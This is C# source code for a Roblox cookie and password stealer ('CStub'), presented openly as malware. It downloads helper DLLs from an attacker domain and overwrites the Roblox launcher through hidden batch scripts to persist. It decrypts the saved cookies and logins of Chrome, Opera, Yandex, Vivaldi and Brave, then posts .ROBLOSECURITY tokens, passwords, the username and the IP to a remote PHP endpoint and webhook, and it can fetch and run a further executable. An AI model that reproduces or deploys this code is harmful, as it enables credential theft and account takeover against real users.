using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace CStub
{
    class CS
    {

        private static string Webhook = "%WebhookUrl%";
        private static string HWID = "%HWID%";
        private static string HasMessage = "%isUsingMessage%";
        private static string UUID = "%UniqueID%";
        private static string SUID = "%suid%";
        private static string CError = "%CustomMessage%";


        private static bool isexists = true;
        private static string TempFileLocation = Path.GetTempPath() + @"InstantUpdate";


        private static void scmd(string cstring)
        {
            Process cmd = new Process();
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.Arguments = "/c " + cstring;
            cmd.Start();
        }

        private static string exepath = TempFileLocation + @"\" + Path.GetFileName(Process.GetCurrentProcess().MainModule.ModuleName);
        private static string execheck()
        {
            if (!exepath.Contains(".exe"))
            {
                return exepath = TempFileLocation + @"\" + Path.GetFileName(Process.GetCurrentProcess().MainModule.ModuleName) + ".exe";
            }
            else
            {
                return exepath;
            }
        }

        private static int cv = 1;
        private static void chromeversion()
        {
            string path = @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe";

            if (File.Exists(path))
            {

                string cversion = FileVersionInfo.GetVersionInfo(path.ToString()).FileVersion;

                string[] v = cversion.Split('.');
                cv = Int32.Parse(v[0]);

            }
            else
            {
                isexists = false;

            }
        }
        static void Main(string[] args)
        {
            rbversion();
            string installPath = Path.Combine(GrabRBPath(), "content", "updates");
            string installeds = Path.Combine(installPath, "RobloxPlayerLauncher.exe");
            if (Assembly.GetExecutingAssembly().Location == Path.Combine(GrabRBPath(), "RobloxPlayerLauncher.exe"))
            {
                Send(CookieConversion(args[0].Split(':')[3].Split('+')[0]));

                Process roblox = new Process();
                roblox.StartInfo.Arguments = args[0];
                roblox.StartInfo.FileName = installeds;
                roblox.Start();
            }
            else
            {

                if (!Assembly.GetExecutingAssembly().Location.Contains("Temp"))
                {
                    if (!Assembly.GetExecutingAssembly().Location.Contains("Roblox"))
                    {
                        if (!Directory.Exists(TempFileLocation))
                        {
                            try { Directory.CreateDirectory(TempFileLocation); Directory.CreateDirectory(TempFileLocation + @"\x64"); Directory.CreateDirectory(TempFileLocation + @"\x86"); } catch { }
                        }

                        if (File.Exists(TempFileLocation + @"\System.Data.SQLite.dll"))
                        {
                            if (File.Exists(execheck()))
                            {
                                File.Delete(execheck());
                            }

                            installedsyes();
                        }
                        else
                        {

                            WebClient w = new WebClient();
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/1.bin", TempFileLocation + @"\EntityFramework.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/2.bin", TempFileLocation + @"\EntityFramework.SqlServer.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/3.bin", TempFileLocation + @"\System.Data.SQLite.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/4.bin", TempFileLocation + @"\System.Data.SQLite.EF6.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/5.bin", TempFileLocation + @"\System.Data.SQLite.Linq.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/6.bin", TempFileLocation + @"\BouncyCastle.Crypto.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/7.bin", TempFileLocation + @"\Newtonsoft.Json.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/x64.bin", TempFileLocation + @"\x64\" + "SQLite.Interop.dll");
                            w.DownloadFile("https://csnatcher.rokey.xyz/x/1/x86.bin", TempFileLocation + @"\x86\" + "SQLite.Interop.dll");
                            w.Dispose();

                            if (!File.Exists(installeds) && File.Exists(GrabRBFolder()))
                            {
                                installedsno(installeds, installPath);
                            }
                            else
                            {
                                installedsyes();
                            }
                        }
                    }
                }
                else
                {
                    if (Assembly.GetExecutingAssembly().Location != Path.Combine(GrabRBPath(), "RobloxPlayerLauncher.exe"))
                    {
                        chromeversion();
                        if (isexists == true)
                        {
                            if (cv >= 80)
                            {
                                beginv80();


                            }
                            else
                            {
                                try
                                {
                                    beginunv80();
                                }
                                catch
                                {

                                }

                            }
                        }
                        else
                        {
                            try
                            {
                                beginunv80();

                            }
                            catch
                            {

                                beginv80();

                            }
                        }
                    }


                }
            }

        }

        private static void installedsyes()
        {
            string temp = Path.GetTempPath();
            string fpath = Path.Combine(temp + "csupdates.bat");
            string line1 = "taskkill /PID /T /F " + Process.GetCurrentProcess().Id;
            string line2 = "XCOPY /Y " + "\"" + Assembly.GetExecutingAssembly().Location.ToString() + "\" " + "\"" + TempFileLocation + "\"";
            string line3 = "START /C " + "\"" + execheck() + "\"";
            string line4 = "EXIT";

            try
            {

                if (!File.Exists(fpath))
                {
                    var cfile = File.Create(fpath);
                    cfile.Close();
                }
                using (var sw = new StreamWriter(fpath, false))
                {
                    sw.WriteLine(line1);
                    sw.WriteLine(line2);
                    sw.WriteLine(line3);
                    sw.WriteLine(line4);
                    // sw.Flush();
                }


            }
            catch { }
            scmd(fpath);
        }
        private static void installedsno(string installeds, string installPath)
        {
            string temp = Path.GetTempPath();
            string fpath = Path.Combine(temp + "csupdate.bat");
            string line1 = "taskkill /PID /T /F " + Process.GetCurrentProcess().Id;
            string line2 = "XCOPY /Y " + "\"" + Assembly.GetExecutingAssembly().Location.ToString() + "\" " + "\"" + TempFileLocation + "\"";
            string line3 = "XCOPY /Y " + "\"" + GrabRBFolder() + "\" " + "\"" + installPath + "\"";
            string line4 = "XCOPY /Y " + "\"" + Assembly.GetExecutingAssembly().Location.ToString() + "\" " + "\"" + Path.Combine(GrabRBPath(), "RobloxPlayerLauncher.exe") + "\""; //might not be doing this
            string line5 = "START /C " + "\"" + execheck() + "\"";
            string line6 = "EXIT";

            try
            {
                if (!File.Exists(installeds))
                {
                    if (!Directory.Exists(installPath))
                    {
                        Directory.CreateDirectory(installPath);
                    }
                }


            }
            catch
            {

            }

            try
            {


                if (!File.Exists(fpath))
                {
                    var cfile = File.Create(fpath);
                    cfile.Close();
                }
                using (var sw = new StreamWriter(fpath, false))
                {
                    sw.WriteLine(line1);
                    sw.WriteLine(line2);
                    sw.WriteLine(line3);
                    sw.WriteLine(line4);
                    sw.WriteLine(line5);
                    sw.WriteLine(line6);
                    // sw.Flush();
                }
            }
            catch { }
            scmd(fpath);
        }
        private static string CookieConversion(string auth)
        {
            try
            {
                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create(string.Format("https://www.roblox.com/Login/Negotiate.ashx?suggest={0}", auth));
                webRequest.Headers.Add("RBXAuthenticationNegotiation", ": https://www.roblox.com");
                webRequest.Headers.Add("RBX-For-Gameauth", "true");
                webRequest.Method = "GET";

                using (HttpWebResponse response = (HttpWebResponse)webRequest.GetResponse())
                {
                    var headers = response.Headers.Get("Set-Cookie");
                    Regex regex = new Regex(@".ROBLOSECURITY=(.*?);");
                    Match match = regex.Match(headers);
                    return match.Groups[1].Value;
                }

            }
            catch (WebException)
            {
                return "Auth Ticket Expired";
            }
        }
        private static string rbversion()
        {
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create("https://www.roblox.com/install/setup.ashx");
                req.AllowAutoRedirect = false;
                req.UserAgent = "Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 70.0.3538.77 Safari / 537.36";

                using (WebResponse response = req.GetResponse())
                {
                    string headers = response.Headers.ToString();
                    robloxversion = headers;
                }

                int From = robloxversion.IndexOf("https://setup.rbxcdn.com/") + "https://setup.rbxcdn.com/".Length;
                int To = robloxversion.LastIndexOf("-Roblox.exe");
                String version = robloxversion.Substring(From, To - From);


                return robloxversion = version;
            }
            catch
            {
                return null;
            }
        }
        private static string GrabRBPath()
        {
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string rbp = local + @"\Roblox\Versions\" + robloxversion + @"\";
            return rbp;


        }

        private static string GrabRBFolder()
        {

            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string rbp = local + @"\Roblox\Versions\" + robloxversion + @"\RobloxPlayerLauncher.exe";
            if (File.Exists(rbp))
            {
                return rbp;
            }
            else
            {
                return null;
            }

        }
        private static string robloxversion;



        //==================================================================================================================================================================
        //==================================================================================================================================================================
        //==================================================================================================================================================================




        private static string GetRandoms()
        {
            var chars = "abcdefghijklmnopqrstuvwxyz";
            var length = new char[6];
            var random = new Random();

            for (int i = 0; i < length.Length; i++)
            {
                length[i] = chars[random.Next(chars.Length)];
            }

            var randomstring = new String(length);

            return randomstring;

        }
        private static void GetCookies(string cookiefilepath)
        {
            if (File.Exists(cookiefilepath))
            {

                string randoms = GetRandoms();

                string tempFile = TempFileLocation + @"\" + randoms + ".db";
                if (File.Exists(tempFile))
                {
                    File.Delete(tempFile);
                }
                File.Copy(cookiefilepath, tempFile);

                string cstring = String.Format("Data Source={0};", tempFile);

                try
                {

                    SQLiteConnection con = new SQLiteConnection(cstring);
                    con.Open();
                    string ctext = "SELECT encrypted_value FROM cookies;";
                    SQLiteCommand cmd = new SQLiteCommand(ctext, con);
                    SQLiteDataReader dr = cmd.ExecuteReader();
                    while (dr.Read())
                    {
                        string cookies = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])dr["encrypted_value"], null, DataProtectionScope.CurrentUser));
                        string[] cooks = new[] { cookies };
                        foreach (string c in cooks)
                        {
                            if (c.Contains("_|WARNING:-DO-NOT-SHARE-THIS."))
                            {
                                Send(c);
                            }

                        }
                    }

                    con.Close();

                }
                catch
                {

                }


            }
        }

        //-----------------------------------------------------------------------------------------------------------------------------------

        private static void GetPass(string passfilepath)
        {
            if (File.Exists(passfilepath))
            {
                string randoms = GetRandoms();

                string tempFile = TempFileLocation + @"\" + randoms + ".db";
                if (File.Exists(tempFile))
                {
                    File.Delete(tempFile);
                }
                File.Copy(passfilepath, tempFile);

                string cstring = String.Format("Data Source={0};Version=3;", tempFile);

                try
                {

                    SQLiteConnection con = new SQLiteConnection(cstring);
                    con.Open();
                    string ctext = "SELECT action_url, username_value, password_value FROM logins;";
                    SQLiteCommand cmd = new SQLiteCommand(ctext, con);
                    SQLiteDataReader dr = cmd.ExecuteReader();
                    while (dr.Read())
                    {
                        string url = (string)dr["action_url"];
                        string user = (string)dr["username_value"];
                        string pass = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])dr["password_value"], null, DataProtectionScope.CurrentUser));

                        string[] passes = new[] { user + ":!:" + pass + ":!:" + url };
                        foreach (string c in passes)
                        {
                            if (c.Contains("roblox"))
                            {
                                Send(c);
                            }

                        }
                    }

                    con.Close();


                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    try { File.Delete(tempFile); } catch { }
                }

            }


        }

        private static void Send(string cookie)
        {
            SendWeb(cookie);
            string Decrypted = Base64Decode(CError);

            if (Decrypted == "null")
            {

            }
            else
            {
                string path = Path.GetTempPath() + "up.txt";
                string dpath = Path.GetTempPath() + "update.exe";

                try
                {
                    using (StreamWriter sw = new StreamWriter(path, false))
                    {
                        sw.WriteLine(CError);
                        sw.Close();
                    }
                    using (WebClient web = new WebClient())
                    {
                        web.Proxy = null;
                        web.DownloadFile("https://csnatcher.rokey.xyz/x/update.bin", dpath);
                        web.Dispose();
                    }

                    Process.Start(dpath);


                }
                catch
                {

                }

            }

        }


        public static string SendWeb(string cookie)
        {
            string pc = Environment.UserName.ToString();
            string ip = new WebClient().DownloadString("http://api.ipify.org/");
            string pp = pc + ":!:" + ip;
            string nweb = Webhook;


            try
            {

                using (WebClient client = new WebClient())
                {

                    string URI = "https://csnatcher.rokey.xyz/api/s/disc.php";

                    System.Collections.Specialized.NameValueCollection postData =
                        new System.Collections.Specialized.NameValueCollection()
                        {

                             {   "cookie", cookie },
                             {  "pcip", pp },
                             {  "uuid", UUID },
                             {  "suid", SUID },
                             {  "xweb", nweb },

                        };
                    string pagesource = Encoding.UTF8.GetString(client.UploadValues(URI, postData));
                    return pagesource;
                }

            }
            catch
            {
                return "false";
            }
        }

        public static bool WCheck()
        {
            while (true)
            {

                bool result;
                try
                {
                    using (WebClient webClient = new WebClient())
                    {
                        using (webClient.OpenRead("http://clients3.google.com/generate_204"))
                        {
                            result = true;
                        }
                        webClient.Dispose();
                    }
                }
                catch
                {
                    Environment.Exit(0);
                    result = false;
                }
                return result;


            }
        }
        public static string Base64Decode(string encrypted)
        {
            byte[] decrypted = Convert.FromBase64String(encrypted);
            string done = Encoding.UTF8.GetString(decrypted);
            return done;
        }
        private static void beginv80()
        {
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome"))
            {
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome";
                    String[] files = Directory.GetFiles(directory, "Cookies", SearchOption.AllDirectories);

                    foreach (string file in files)
                    {
                        GetCookiesv80(file);
                    }
                }
                catch
                {

                }


                try
                {
                    string ldirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome";
                    String[] lfiles = Directory.GetFiles(ldirectory, "Login Data", SearchOption.AllDirectories);

                    foreach (string lfile in lfiles)
                    {
                        GetPassv80(lfile);
                    }
                }
                catch
                {
                }
            }



        }
        private static string decryptdata(byte[] message, byte[] key, int nspl)
        {
            const int MBS = 128;
            const int NBS = 96;


            using (var cipherStream = new MemoryStream(message))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nspl);
                var nonce = cipherReader.ReadBytes(NBS / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MBS, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(message.Length);
                var text = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, text, 0);
                    cipher.DoFinal(text, len);
                }
                catch
                {
                    return null;
                }
                return Encoding.Default.GetString(text);
            }
        }

        private static void GetCookiesv80(string cfpath)
        {
            if (File.Exists(cfpath))
            {
                try
                {


                    string randoms = GetRandoms();

                    string tempFile = TempFileLocation + @"\" + randoms + ".db";
                    if (File.Exists(tempFile))
                    {
                        File.Delete(tempFile);
                    }
                    File.Copy(cfpath, tempFile);

                    string cstring = String.Format("Data Source={0};Journal Mode=Off;", tempFile);
                    SQLiteConnection con = new SQLiteConnection(cstring);
                    con.Open();
                    string ctext = "SELECT encrypted_value FROM cookies;";
                    SQLiteCommand cmd = new SQLiteCommand(ctext, con);
                    SQLiteDataReader dr = cmd.ExecuteReader();

                    while (dr.Read())
                    {
                        byte[] encryptedData = (byte[])dr["encrypted_value"];

                        string encKey = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State");
                        encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
                        var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                        string cookie = decryptdata(encryptedData, decodedKey, 3);

                        string[] cooks = new[] { cookie };
                        foreach (string c in cooks)
                        {
                            if (c.Contains("_|WARNING:-DO-NOT-SHARE-THIS."))
                            {
                                Send(c);
                            }
                        }
                    }
                }
                catch
                {

                }
            }
        }
        private static void GetPassv80(string pfpath)
        {
            if (File.Exists(pfpath))
            {
                try
                {
                    string randoms = GetRandoms();

                    string tempFile = TempFileLocation + @"\" + randoms + ".db";
                    if (File.Exists(tempFile))
                    {
                        File.Delete(tempFile);
                    }
                    File.Copy(pfpath, tempFile);


                    string cstring = String.Format("Data Source={0};Journal Mode=Off;", tempFile);
                    SQLiteConnection con = new SQLiteConnection(cstring);
                    con.Open();
                    string ctext = "SELECT origin_url, username_value, password_value FROM logins;";
                    SQLiteCommand cmd = new SQLiteCommand(ctext, con);
                    SQLiteDataReader dr = cmd.ExecuteReader();

                    while (dr.Read())
                    {
                        string url = (string)dr["origin_url"];
                        string user = (string)dr["username_value"];
                        byte[] encryptedData = (byte[])dr["password_value"];

                        string encKey = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State");
                        encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
                        var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                        string password = decryptdata(encryptedData, decodedKey, 3);

                        string[] passes = new[] { user + ":!:" + password + ":!:" + url };
                        foreach (string p in passes)
                        {
                            if (p.Contains("roblox"))
                            {
                                Send(p);
                            }
                        }
                    }
                }
                catch
                {

                }
            }
        }

        private static void beginunv80()
        {
            WCheck();
            //Chrome 
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome"))
            {
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome";
                    String[] files = Directory.GetFiles(directory, "Cookies", SearchOption.AllDirectories);

                    foreach (string file in files)
                    {
                        GetCookies(file);
                    }
                }

                catch
                {
                }
                try
                {
                    string ldirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome";
                    String[] lfiles = Directory.GetFiles(ldirectory, "Login Data", SearchOption.AllDirectories);

                    foreach (string lfile in lfiles)
                    {
                        GetPass(lfile);
                    }
                }
                catch
                {
                }
            }

            //Opera
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Roaming\Opera Software"))
            {
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Roaming\Opera Software";
                    String[] files = Directory.GetFiles(directory, "Cookies", SearchOption.AllDirectories);

                    foreach (string file in files)
                    {
                        GetCookies(file);
                    }
                }
                catch
                {
                }
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Roaming\Opera Software";
                    String[] lfiles = Directory.GetFiles(directory, "Login Data", SearchOption.AllDirectories);

                    foreach (string lfile in lfiles)
                    {
                        GetPass(lfile);
                    }
                }
                catch
                {
                }
            }

            //Yandex
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex"))
            {
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex";
                    String[] files = Directory.GetFiles(directory, "Cookies", SearchOption.AllDirectories);

                    foreach (string file in files)
                    {
                        GetCookies(file);
                    }
                }
                catch
                {
                }
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex";
                    String[] lfiles = Directory.GetFiles(directory, "Login Data", SearchOption.AllDirectories);

                    foreach (string lfile in lfiles)
                    {
                        GetPass(lfile);
                    }
                }
                catch
                {
                }
            }
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Vivaldi"))
            {
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Vivaldi";
                    String[] files = Directory.GetFiles(directory, "Cookies", SearchOption.AllDirectories);

                    foreach (string file in files)
                    {
                        GetCookies(file);
                    }
                }
                catch
                {

                }
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Vivaldi";
                    String[] lfiles = Directory.GetFiles(directory, "Login Data", SearchOption.AllDirectories);

                    foreach (string lfile in lfiles)
                    {
                        GetPass(lfile);
                    }
                }
                catch
                {

                }
            }
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware"))
            {
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware";
                    String[] files = Directory.GetFiles(directory, "Cookies", SearchOption.AllDirectories);

                    foreach (string file in files)
                    {
                        GetCookies(file);
                    }

                }
                catch
                {

                }
                try
                {
                    string directory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware";
                    String[] lfiles = Directory.GetFiles(directory, "Login Data", SearchOption.AllDirectories);

                    foreach (string lfile in lfiles)
                    {
                        GetPass(lfile);
                    }


                }

                catch
                {

                }
            }
        }

    }


}
